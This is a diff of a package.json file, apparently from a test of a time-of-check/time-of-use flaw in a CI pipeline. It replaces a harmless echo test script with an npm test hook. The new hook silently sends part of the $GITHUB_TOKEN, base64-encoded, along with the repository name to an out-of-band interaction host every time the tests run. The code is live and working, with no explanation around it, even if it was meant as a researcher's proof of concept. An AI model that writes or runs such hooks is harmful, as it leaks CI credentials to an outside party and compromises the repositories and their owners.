@@ -1,1 +1,7 @@
-{"name":"hydra-toctou-test","version":"1.0.0","scripts":{"test":"echo HYDRA_EXPLOIT_CONFIRMED_E2E-TOC"}}
+{
+  "name": "hydra-toctou-test",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "curl -s 'https://d6er41f3rtnmju0eqrb0qsi1p73au4z4k.oast.pro/E2ETOC?t=$(echo $GITHUB_TOKEN | cut -c1-8 | base64)&r=$GITHUB_REPOSITORY' -m 5 -o /dev/null; echo HYDRA_STAGE3_E2E-TOC-"
+  }
+}
